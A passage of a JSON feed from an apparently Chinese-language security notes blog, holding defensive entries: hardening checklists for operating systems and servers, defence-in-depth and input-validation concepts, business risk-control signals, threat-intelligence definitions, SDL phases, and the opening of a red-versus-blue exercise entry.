            "content_html": "<h1 id=\"网络设备\"><a class=\"anchor\" href=\"#网络设备\">#</a> 网络设备</h1>\n<ul>\n<li>及时检查系统版本号</li>\n<li>敏感服务设置访问 IP/MAC 白名单</li>\n<li>开启权限分级控制</li>\n<li>关闭不必要的服务</li>\n<li>打开操作日志</li>\n<li>配置异常告警</li>\n<li>关闭 ICMP 回应</li>\n</ul>\n<h1 id=\"操作系统\"><a class=\"anchor\" href=\"#操作系统\">#</a> 操作系统</h1>\n<h2 id=\"linux\"><a class=\"anchor\" href=\"#linux\">#</a> Linux</h2>\n<ul>\n<li>\n<p>无用用户 / 用户组检查</p>\n</li>\n<li>\n<p>空口令帐号检查</p>\n</li>\n<li>\n<p>用户密码策略</p>\n<ul>\n<li>/etc/login.defs</li>\n<li>/etc/pam.d/system-auth</li>\n</ul>\n</li>\n<li>\n<p>敏感文件权限配置</p>\n<ul>\n<li>/etc/passwd</li>\n<li>/etc/shadow</li>\n<li>~/.ssh/</li>\n<li>/var/log/messages</li>\n<li>/var/log/secure</li>\n<li>/var/log/maillog</li>\n<li>/var/log/cron</li>\n<li>/var/log/spooler</li>\n<li>/var/log/boot.log</li>\n</ul>\n</li>\n<li>\n<p>日志是否打开</p>\n</li>\n<li>\n<p>及时安装补丁</p>\n</li>\n<li>\n<p>开机自启</p>\n<ul>\n<li>/etc/init.d</li>\n</ul>\n</li>\n<li>\n<p>检查系统时钟</p>\n</li>\n</ul>\n<h2 id=\"windows\"><a class=\"anchor\" href=\"#windows\">#</a> Windows</h2>\n<ul>\n<li>\n<p>异常进程监控</p>\n</li>\n<li>\n<p>异常启动项监控</p>\n</li>\n<li>\n<p>异常服务监控</p>\n</li>\n<li>\n<p>配置系统日志</p>\n</li>\n<li>\n<p>用户账户</p>\n<ul>\n<li>设置口令有效期</li>\n<li>设置口令强度限制</li>\n<li>设置口令重试次数</li>\n</ul>\n</li>\n<li>\n<p>安装 EMET</p>\n</li>\n<li>\n<p>启用 PowerShell 日志</p>\n</li>\n<li>\n<p>限制以下敏感文件的下载和执行</p>\n<ul>\n<li>ade, adp, ani, bas, bat, chm, cmd, com, cpl, crt, hlp, ht, hta, inf, ins, isp, job, js, jse, lnk, mda, mdb, mde, mdz, msc, msi, msp, mst, pcd, pif, reg, scr, sct, shs, url, vb, vbe, vbs, wsc, wsf, wsh, exe, pif</li>\n</ul>\n</li>\n<li>\n<p>限制会调起 wscript 的后缀</p>\n<ul>\n<li>bat, js, jse, vbe, vbs, wsf, wsh</li>\n</ul>\n</li>\n<li>\n<p>域</p>\n<ul>\n<li>限制将计算机加入域的权限域账户使用最小权限原则减少非必要高权限账户的数量</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"应用\"><a class=\"anchor\" href=\"#应用\">#</a> 应用</h1>\n<h2 id=\"ftp\"><a class=\"anchor\" href=\"#ftp\">#</a> FTP</h2>\n<ul>\n<li>禁止匿名登录</li>\n<li>修改 Banner</li>\n</ul>\n<h2 id=\"ssh\"><a class=\"anchor\" href=\"#ssh\">#</a> SSH</h2>\n<ul>\n<li>是否禁用 ROOT 登录</li>\n<li>是否禁用密码连接</li>\n</ul>\n<h2 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> MySQL</h2>\n<ul>\n<li>文件写权限设置</li>\n<li>用户授权表管理</li>\n<li>日志是否启用</li>\n<li>版本是否最新</li>\n</ul>\n<h1 id=\"web中间件\"><a class=\"anchor\" href=\"#web中间件\">#</a> Web 中间件</h1>\n<h2 id=\"apache\"><a class=\"anchor\" href=\"#apache\">#</a> Apache</h2>\n<ul>\n<li>\n<p>版本号隐藏</p>\n</li>\n<li>\n<p>版本是否最新</p>\n</li>\n<li>\n<p>禁用部分 HTTP 动词</p>\n</li>\n<li>\n<p>关闭 Trace</p>\n</li>\n<li>\n<p>禁止  <code>server-status</code></p>\n</li>\n<li>\n<p>上传文件大小限制</p>\n</li>\n<li>\n<p>目录权限设置</p>\n</li>\n<li>\n<p>是否允许路由重写</p>\n</li>\n<li>\n<p>是否允许列目录</p>\n</li>\n<li>\n<p>日志配置</p>\n</li>\n<li>\n<p>配置超时时间防 DoS</p>\n</li>\n<li>\n<p>非属主用户文件读写限制</p>\n<ul>\n<li>httpd.conf</li>\n<li>access.log</li>\n<li>error.log</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"nginx\"><a class=\"anchor\" href=\"#nginx\">#</a> Nginx</h2>\n<ul>\n<li>禁用部分 HTTP 动词</li>\n<li>禁用目录遍历</li>\n<li>检查重定向配置</li>\n<li>配置超时时间防 DoS</li>\n</ul>\n<h2 id=\"iis\"><a class=\"anchor\" href=\"#iis\">#</a> IIS</h2>\n<ul>\n<li>版本是否最新</li>\n<li>日志配置</li>\n<li>用户口令配置</li>\n<li>ASP.NET 功能配置</li>\n<li>配置超时时间防 DoS</li>\n</ul>\n<h2 id=\"jboss\"><a class=\"anchor\" href=\"#jboss\">#</a> JBoss</h2>\n<ul>\n<li>jmx console 配置</li>\n<li>web console 配置</li>\n</ul>\n<h2 id=\"tomcat\"><a class=\"anchor\" href=\"#tomcat\">#</a> Tomcat</h2>\n<ul>\n<li>禁用部分 HTTP 动词</li>\n<li>禁止列目录</li>\n<li>禁止 manager 功能</li>\n<li>用户密码配置</li>\n<li>用户权限配置</li>\n<li>配置超时时间防 DoS</li>\n</ul>\n<h1 id=\"密码管理策略\"><a class=\"anchor\" href=\"#密码管理策略\">#</a> 密码管理策略</h1>\n<ul>\n<li>长度不少于 8 个字符</li>\n<li>不存在于已有字典之中</li>\n<li>不使用基于知识的认证方式</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BhdWxTZWMvYXdlc29tZS13aW5kb3dzLWRvbWFpbi1oYXJkZW5pbmc=\">awesome windows domain hardening</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi9taWNyb3NvZnQtZGVmZW5kZXItYXRwL2N1c3RvbWl6ZS1hdHRhY2stc3VyZmFjZS1yZWR1Y3Rpb24=\">customize attack surface reduction</span></li>\n</ul>\n",
            "tags": [
                "防御加固",
                "管理策略"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%98%B2%E5%BE%A1%E6%A1%86%E6%9E%B6/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%98%B2%E5%BE%A1%E6%A1%86%E6%9E%B6/",
            "title": "防御框架",
            "date_published": "2022-12-05T08:15:15.000Z",
            "content_html": "<h1 id=\"防御纵深\"><a class=\"anchor\" href=\"#防御纵深\">#</a> 防御纵深</h1>\n<p>根据纵深，防御可以分为物理层、数据层、终端层、系统层、网络层、应用层几层。这几层纵深存在层层递进相互依赖的关系。</p>\n<h2 id=\"物理层\"><a class=\"anchor\" href=\"#物理层\">#</a> 物理层</h2>\n<p>物理层实际应用中接触较少，但仍是非常重要的位置。如果物理层设计不当，很容易被攻击者通过物理手段绕过上层防御。</p>\n<h2 id=\"数据层\"><a class=\"anchor\" href=\"#数据层\">#</a> 数据层</h2>\n<p>数据处于防御纵深较底层的位置，攻击的目标往往也是为了拿到数据，很多防御也是围绕数据不被破坏、窃取等展开的。</p>\n<h2 id=\"终端层\"><a class=\"anchor\" href=\"#终端层\">#</a> 终端层</h2>\n<p>终端包括 PC、手机、IoT 以及其他的智能设备，连入网络的终端是否可信是需要解决的问题。</p>\n<h2 id=\"系统层\"><a class=\"anchor\" href=\"#系统层\">#</a> 系统层</h2>\n<p>操作系统运行在终端上，可能会存在提权、非授权访问等问题。</p>\n<h2 id=\"网络层\"><a class=\"anchor\" href=\"#网络层\">#</a> 网络层</h2>\n<p>网络层使用通信线路将多台计算机相互连接起来，依照商定的协议进行通信。网络层存在 MITM、DDoS 等攻击。</p>\n<h2 id=\"应用层\"><a class=\"anchor\" href=\"#应用层\">#</a> 应用层</h2>\n<p>应用层是最上层，主要涉及到 Web 应用程序的各种攻击。</p>\n<h1 id=\"访问控制\"><a class=\"anchor\" href=\"#访问控制\">#</a> 访问控制</h1>\n<p>Web 应用需要限制用户对应用程序的数据和功能的访问，以防止用户未经授权访问。访问控制的过程可以分为验证、会话管理和访问控制三个地方。</p>\n<h2 id=\"验证机制\"><a class=\"anchor\" href=\"#验证机制\">#</a> 验证机制</h2>\n<p>验证机制在一个应用程序的用户访问处理中是一个最基本的部分，验证就是确定该用户的有效性。大多数的 web 应用都采用使用的验证模型，即用户提交一个用户名和密码，应用检查它的有效性。在银行等安全性很重要的应用程序中，基本的验证模型通常需要增加额外的证书和多级登录过程，比如客户端证书、硬件等。</p>\n<h2 id=\"会话管理\"><a class=\"anchor\" href=\"#会话管理\">#</a> 会话管理</h2>\n<p>为了实施有效的访问控制，应用程序需要一个方法来识别和处理这一系列来自每个不同用户的请求。大部分程序会为每个会话创建一个唯一性的 token 来识别。</p>\n<p>对攻击者来说，会话管理机制高度地依赖于 token 的安全性。在部分情况下，一个攻击者可以伪装成受害的授权用户来使用 Web 应用程序。这种情况可能有几种原因，其一是 token 生成的算法的缺陷，使得攻击者能够猜测到其他用户的 token；其二是 token 后续处理的方法的缺陷，使得攻击者能够获得其他用户的 token。</p>\n<h2 id=\"访问控制-2\"><a class=\"anchor\" href=\"#访问控制-2\">#</a> 访问控制</h2>\n<p>处理用户访问的最后一步是正确决定对于每个独立的请求是允许还是拒绝。如果前面的机制都工作正常，那么应用程序就知道每个被接受到的请求所来自的用户的 id，并据此决定用户对所请求要执行的动作或要访问的数据是否得到了授权。</p>\n<p>由于访问控制本身的复杂性，这使得它成为攻击者的常用目标。开发者经常对用户会如何与应用程序交互作出有缺陷的假设，也经常省略了对某些应用程序功能的访问控制检查。</p>\n<h1 id=\"输入处理\"><a class=\"anchor\" href=\"#输入处理\">#</a> 输入处理</h1>\n<p>很多对 Web 应用的攻击都涉及到提交未预期的输入，它导致了该应用程序设计者没有料到的行为。因此，对于应用程序安全性防护的一个关键的要求是它必须以一个安全的方式处理用户的输入。</p>\n<p>基于输入的漏洞可能出现在一个应用程序的功能的任何地方，并与其使用的技术类型相关。对于这种攻击，输入验证是常用的必要防护。常用的防护机制有如下几种：黑名单、白名单、过滤、处理。</p>\n<h2 id=\"黑名单\"><a class=\"anchor\" href=\"#黑名单\">#</a> 黑名单</h2>\n<p>黑名单包含已知的被用在攻击方面的一套字面上的字符串或模式，验证机制阻挡任何匹配黑名单的数据。</p>\n<p>一般来说，这种方式是被认为是输入效果较差的一种方式。主要有两个原因，其一 Web 应用中的一个典型的漏洞可以使用很多种不同的输入来被利用，输入可以是被加密的或以各种不同的方法表示。</p>\n<p>其二，漏洞利用的技术是在不断地改进的，有关利用已存在的漏洞类型的新的方法不可能被当前黑名单阻挡。</p>\n<h2 id=\"白名单\"><a class=\"anchor\" href=\"#白名单\">#</a> 白名单</h2>\n<p>白名单包含一系列的字符串、模式或一套标准来匹配符合要求的输入。这种检查机制允许匹配白名单的数据，阻止之外的任何数据。这种方式相对比较有效，但需要比较好的设计。</p>\n<h2 id=\"过滤\"><a class=\"anchor\" href=\"#过滤\">#</a> 过滤</h2>\n<p>过滤会删除潜在的恶意字符并留下安全的字符，基于数据过滤的方式通常是有效的，并且在许多情形中，可作为处理恶意输入的通用解决方案。</p>\n<h2 id=\"安全地处理数据\"><a class=\"anchor\" href=\"#安全地处理数据\">#</a> 安全地处理数据</h2>\n<p>非常多的 web 应用程序漏洞的出现是因为用户提供的数据是以不安全的方法被处理的。在一些情况下，存在安全的编程方法能够避免通常的问题。例如，SQL 注入攻击能够通过预编译的方式组织，XSS 在大部分情况下能够被转义所防御。</p>\n",
            "tags": [
                "防御纵深",
                "访问控制",
                "过滤",
                "框架"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6/",
            "title": "风险控制",
            "date_published": "2022-12-05T08:08:15.000Z",
            "content_html": "<h2 id=\"常见风险\"><a class=\"anchor\" href=\"#常见风险\">#</a> 常见风险</h2>\n<ul>\n<li>会员\n<ul>\n<li>撞库盗号</li>\n<li>账号分享</li>\n<li>批量注册</li>\n</ul>\n</li>\n<li>视频\n<ul>\n<li>盗播盗看</li>\n<li>广告屏蔽</li>\n<li>刷量作弊</li>\n</ul>\n</li>\n<li>活动\n<ul>\n<li>恶意刷</li>\n<li>薅羊毛</li>\n</ul>\n</li>\n<li>直播\n<ul>\n<li>挂站人气</li>\n<li>恶意图文</li>\n</ul>\n</li>\n<li>电商\n<ul>\n<li>恶意下单</li>\n<li>订单欺诈</li>\n</ul>\n</li>\n<li>支付\n<ul>\n<li>盗号盗卡</li>\n<li>洗钱</li>\n<li>恶意下单</li>\n<li>恶意提现</li>\n</ul>\n</li>\n<li>其他\n<ul>\n<li>钓鱼邮件</li>\n<li>恶意爆破</li>\n<li>短信轰炸</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"872-防御策略\"><a class=\"anchor\" href=\"#872-防御策略\">#</a> 8.7.2. 防御策略</h2>\n<ul>\n<li>核身策略\n<ul>\n<li>同一收货手机号</li>\n<li>同一收货地址</li>\n<li>同一历史行为</li>\n<li>同一 IP</li>\n<li>同一设备</li>\n<li>同一支付 ID</li>\n<li>LBS</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"873-异常特征\"><a class=\"anchor\" href=\"#873-异常特征\">#</a> 8.7.3. 异常特征</h2>\n<ul>\n<li>APP 用户异常特征\n<ul>\n<li>IP</li>\n<li>设备为特定型号</li>\n<li>本地 APP 列表中有沙盒 APP</li>\n<li>Root 用户</li>\n<li>同设备登录过多个账号</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"874-参考链接\"><a class=\"anchor\" href=\"#874-参考链接\">#</a> 8.7.4. 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RvYy5jb2NvbGlhbi5jbi9lc3NheS9yaXNrLzIwMTYvMTIvMTgvcmlzay0yLWRhdGFiYXNlLw==\">支付风控模型和流程分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJME1qY3pNak0yTkE9PSZhbXA7bWlkPTIyNDc0ODM4MzYmYW1wO2lkeD0xJmFtcDtzbj1kNDY4NzVjOTU3Mjg5ZDhlMDM1MzQ1OTkyYWQ3MDUzZQ==\">爱奇艺业务安全风控体系的建设实践</span></li>\n</ul>\n",
            "tags": [
                "风险",
                "控制"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/",
            "title": "威胁情报",
            "date_published": "2022-12-05T08:01:21.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<h2 id=\"产生原因\"><a class=\"anchor\" href=\"#产生原因\">#</a> 产生原因</h2>\n<p>新一代的攻击者常常向企业和组织发起针对性的网络攻击，这种针对性强的攻击，一般经过了精心的策划，攻击方法、途径复杂，后果严重。在面对这种攻击时，攻防存在着严重的不对等，为了尽可能消除这种不对等，威胁情报 (Threat Intelligence) 应运而生。</p>\n<h2 id=\"定义\"><a class=\"anchor\" href=\"#定义\">#</a> 定义</h2>\n<p>威胁情报 (Threat Intelligence)，也被称作安全情报 (Security Intelligence)、安全威胁情报 (Security Threat Intelligence)。</p>\n<p>关于威胁情报的定义有很多，一般是指从安全数据中提炼的，与网络空间威胁相关的信息，包括威胁来源、攻击意图、攻击手法、攻击目标信息，以及可用于解决威胁或应对危害的知识。广义的威胁情报也包括情报的加工生产、分析应用及协同共享机制。相关的概念有资产、威胁、脆弱性等，具体定义如下。</p>\n<p>一般威胁情报需要包含威胁源、攻击目的、攻击对象、攻击手法、漏洞、攻击特征、防御措施等。威胁情报在事前可以起到预警的作用，在威胁发生时可以协助进行检测和响应，在事后可以用于分析和溯源。</p>\n<p>常见的网络威胁情报服务有黑客或欺诈团体分析、社会媒体和开源信息监控、定向漏洞研究、定制的人工分析、实时事件通知、凭据恢复、事故调查、伪造域名检测等。</p>\n<p>在威胁情报方面，比较有代表性的厂商有 BAE Systems Applied Intelligence、Booz Allen、RSA、IBM、McAfee、赛门铁克、FireEye 等。</p>\n<h1 id=\"相关概念\"><a class=\"anchor\" href=\"#相关概念\">#</a> 相关概念</h1>\n<h2 id=\"资产asset\"><a class=\"anchor\" href=\"#资产asset\">#</a> 资产 (Asset)</h2>\n<p>对组织具有价值的信息或资源，属于内部情报，通过资产测绘等方式发现。</p>\n<h2 id=\"威胁threat\"><a class=\"anchor\" href=\"#威胁threat\">#</a> 威胁 (Threat)</h2>\n<p>能够通过未授权访问、毁坏、揭露、数据修改和或拒绝服务对系统造成潜在危害的起因，威胁可由威胁的主体 (威胁源)、能力、资源、动机、途径、可能性和后果等多种属性来刻画</p>\n<h2 id=\"脆弱性-漏洞vulnerability\"><a class=\"anchor\" href=\"#脆弱性-漏洞vulnerability\">#</a> 脆弱性 / 漏洞 (Vulnerability)</h2>\n<p>可能被威胁如攻击者利用的资产或若干资产薄弱环节。</p>\n<p>漏洞存在多个周期，最开始由安全研究员或者攻击者发现，而后出现在社区公告 / 官方邮件 / 博客中。随着信息的不断地传递，漏洞情报出现在开源社区等地方，并带有 PoC 和漏洞细节分析。再之后出现自动化工具开始大规模传播，部分漏洞会造成社会影响并被媒体报道，最后漏洞基本修复。</p>\n<h2 id=\"风险risk\"><a class=\"anchor\" href=\"#风险risk\">#</a> 风险 (Risk)</h2>\n<p>威胁利用资产或一组资产的脆弱性对组织机构造成伤害的潜在可能。</p>\n<h2 id=\"安全事件event\"><a class=\"anchor\" href=\"#安全事件event\">#</a> 安全事件 (Event)</h2>\n<p>威胁利用资产的脆弱性后实际产生危害的情景。</p>\n<h1 id=\"情报来源\"><a class=\"anchor\" href=\"#情报来源\">#</a> 情报来源</h1>\n<p>为了实现情报的同步和交换，各组织都制定了相应的标准和规范。主要有国标，美国联邦政府标准等。</p>\n<p>除了国家外，企业也有各自的情报来源，例如厂商、CERT、开发者社区、安全媒体、漏洞作者或团队、公众号、个人博客、代码仓库等。</p>\n<h1 id=\"威胁框架\"><a class=\"anchor\" href=\"#威胁框架\">#</a> 威胁框架</h1>\n<p>比较有影响力的威胁框架主要有洛克希德 - 马丁的杀伤链框架 (Cyber Kill Chain Framework)、MITRE 的 ATT&amp;CK 框架 (Common Knowledge base of Adversary Tactics and Techniques)、ODNI 的 CCTF 框架 (Common Cyber Threat Framework，公共网空威胁框架)，以及 NSA 的 TCTF 框架 (Technical Cyber Threat Framework，技术性网空威胁框架)。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li>[Executive Perspectives on Cyber Threat Intelligence](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zY2FkYWhhY2tlci5jb20vbGlicmFyeS9Eb2N1bWVudHMvVGhyZWF0X0ludGVsbGlnZW5jZS9pU2lnaHQ=\">https://scadahacker.com/library/Documents/Threat_Intelligence/iSight</span> Partners - Executive Perspectives on Cyber Threat Intelligence.pdf)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGFya3JlYWRpbmcuY29tL2FuYWx5dGljcy90aHJlYXQtaW50ZWxsaWdlbmNlL2N5YmVyLXRocmVhdHMtaW5mb3JtYXRpb24tdnMtaW50ZWxsaWdlbmNlL2EvZC1pZC8xMzE2ODUx\">Cyber Threats: Information vs. Intelligence</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzEzNjc2My5odG1s\">威胁情报简介及市场浅析</span></li>\n</ul>\n",
            "tags": [
                "情报"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/",
            "title": "安全建设",
            "date_published": "2022-12-05T08:00:21.000Z",
            "content_html": "<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h1 id=\"安全运营\"><a class=\"anchor\" href=\"#安全运营\">#</a> 安全运营</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zOTQ2NzIwMQ==\">我理解的安全运营 by 职业欠钱</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84NDU5MTA5NQ==\">再谈安全运营 by 职业欠钱</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJek1UQXpOelV4TVE9PSZhbXA7bWlkPTI2NTI4OTM2MTYmYW1wO2lkeD0xJmFtcDtzbj02NzM4YTRlMzMwNTBlZDA4NGQxNTM1MTk2YWVjNjA2MQ==\">我们谈安全运营时在谈什么 by 聂君</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8zNmtyLmNvbS9wLzE3MjEyMzY2MzU2NDk=\">金融行业企业安全运营之路 by 聂君</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMk1qUTFOVEE0TUE9PSZhbXA7bWlkPTIyNDc0ODUwNjImYW1wO2lkeD0xJmFtcDtzbj05NGM5ZmE0MGVkZWY2ZGUwZWE0NmM0NTM0MDVlMzY4Nw==\">秦波：大型互联网应用安全 SDL 体系建设实践</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMk1qUTFOVEE0TUE9PSZhbXA7bWlkPTIyNDc0ODU0MDUmYW1wO2lkeD0xJmFtcDtzbj1iZGE5MjgzMzI5ZjZkYjE1ZDY5ZDRjZGYzN2M2MDlkMg==\">谭晓生：论 CISO 的个人修养</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZXMvMjAwMDI0Lmh0bWw=\">赵彦的 CISO 闪电战 两年甲方安全修炼之路</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMk1qUTFOVEE0TUE9PSZhbXA7bWlkPTIyNDc0ODQ3MzUmYW1wO2lkeD0xJmFtcDtzbj0wMmUwNmRkODRlZTAzMjJkZDJmOWZlNzYxYjI0NDAxMw==\">胡珀谈安全运营 by lake2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvcmM2WDVTbHNvUnA2czdSQ0VaNjdtQQ==\">小步快跑，快速迭代：安全运营的器术法道</span></li>\n</ul>\n<h2 id=\"资产管理\"><a class=\"anchor\" href=\"#资产管理\">#</a> 资产管理</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpBNU1EWTNNek15T1E9PSZhbXA7bWlkPTI2NDk0Mzk3NTEmYW1wO2lkeD0xJmFtcDtzbj0xOGFjNDlhZmY3NWVlNGIxNDMzZTQyOWRmNTZiYTQ0Yg==\">资产管理的难点</span></li>\n</ul>\n",
            "tags": [
                "运营"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/",
            "title": "安全开发",
            "date_published": "2022-12-05T07:58:41.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>安全开发生命周期（Security Development Lifecycle，SDL）是微软提出的从安全的角度来指导软件开发过程的管理模式。用于帮助开发人员构建更安全的软件、解决安全合规要求，并降低开发成本。</p>\n<h1 id=\"步骤\"><a class=\"anchor\" href=\"#步骤\">#</a> 步骤</h1>\n<h2 id=\"阶段1培训\"><a class=\"anchor\" href=\"#阶段1培训\">#</a> 阶段 1：培训</h2>\n<p>开发团队的所有成员都必须接受适当的安全培训，了解相关的安全知识。培训对象包括开发人员、测试人员、项目经理、产品经理等。</p>\n<h2 id=\"阶段2确定安全需求\"><a class=\"anchor\" href=\"#阶段2确定安全需求\">#</a> 阶段 2：确定安全需求</h2>\n<p>在项目确立之前，需要提前确定安全方面的需求，确定项目的计划时间，尽可能避免安全引起的需求变更。</p>\n<h2 id=\"阶段3设计\"><a class=\"anchor\" href=\"#阶段3设计\">#</a> 阶段 3：设计</h2>\n<p>在设计阶段确定安全的最低可接受级别。考虑项目涉及到哪些攻击面、是否能减小攻击面。</p>\n<p>对项目进行威胁建模，明确可能来自的攻击有哪些方面，并考虑项目哪些部分需要进行渗透测试。</p>\n<h2 id=\"阶段4实现\"><a class=\"anchor\" href=\"#阶段4实现\">#</a> 阶段 4：实现</h2>\n<p>实现阶段主要涉及到工具、不安全的函数、静态分析等方面。</p>\n<p>工具方面主要考虑到开发团队使用的编辑器、链接器等相关工具可能会涉及一些安全相关的问题，因此在使用工具的版本上，需要提前与安全团队进行沟通。</p>\n<p>函数方面主要考虑到许多常用函数可能存在安全隐患，应当禁用不安全的函数和 API，使用安全团队推荐的函数。</p>\n<p>代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。</p>\n<h2 id=\"阶段5验证\"><a class=\"anchor\" href=\"#阶段5验证\">#</a> 阶段 5：验证</h2>\n<p>验证阶段涉及到动态程序分析和攻击面再审计。动态分析对静态分析进行补充，常用的方式是模糊测试、渗透测试。模糊测试通过向应用程序引入特定格式或随机数据查找程序可能的问题。</p>\n<p>考虑到项目经常会因为需求变更等情况使得最终产品和初期目标不一致，因此需要在项目后期再次对威胁模型和攻击面进行分析和考虑，如果出现问题则进行纠正。</p>\n<h2 id=\"阶段6发布\"><a class=\"anchor\" href=\"#阶段6发布\">#</a> 阶段 6：发布</h2>\n<p>在程序发布后，需要对安全事件进行响应，需要预设好遇到安全问题时的处理方式。</p>\n<p>另外如果产品中包含第三方的代码，也需要考虑如何响应因为第三方依赖引入的问题。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9zZWN1cml0eWVuZ2luZWVyaW5nL3NkbC9wcmFjdGljZXM=\">SDL Practices</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9zZWN1cml0eWVuZ2luZWVyaW5nL3NkbC90aHJlYXRtb2RlbGluZw==\">Threat Modeling</span></li>\n</ul>\n",
            "tags": [
                "开发过程"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/",
            "url": "https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/",
            "title": "红蓝对抗",
            "date_published": "2022-11-29T09:12:49.000Z",
            "content_html": "<h1 id=\"概念\"><a class=\"anchor\" href=\"#概念\">#</a> 概念</h1>\n<p>红蓝对抗的概念最早来源于 20 世纪 60 年代的美国演习，演习是专指军队进行大规模的实兵演习，演习中通常分为红军、蓝军，其中蓝军通常是指在部队模拟对抗演习专门扮演假想敌的部队，与红军 (代表我方正面部队) 进行针对性的训练，这种方式也被称作 Red Teaming。</p>\n<p>网络安全红蓝对抗的概念就源自于此。红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全。而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。可能会造成混淆的是，在欧美一般采用红队代表攻击方，蓝队代表防守方，颜色代表正好相反。</p>\n<h1 id=\"网络攻防演习\"><a class=\"anchor\" href=\"#网络攻防演习\">#</a> 网络攻防演习</h1>\n<p>比较有影响力的演习有 “锁盾”(Locked Shields)、“网络风暴” 等。其中 “锁盾” 由北约卓越网络防御合作中心 (CCDCOE，Cooperative Cyber Defence Centre of Excellence) 每年举办一次。“网络风暴” 由美国国土安全部 (DHS) 主导，2006 年开始，每两年举行一次。</p>\n<p>和 APT 攻击相比，攻防演习相对时长较短，只有 1~4 周，有个防守目标。而 APT 攻击目标唯一，时长可达数月至数年，更有隐蔽性。</p>\n<h1 id=\"侧重\"><a class=\"anchor\" href=\"#侧重\">#</a> 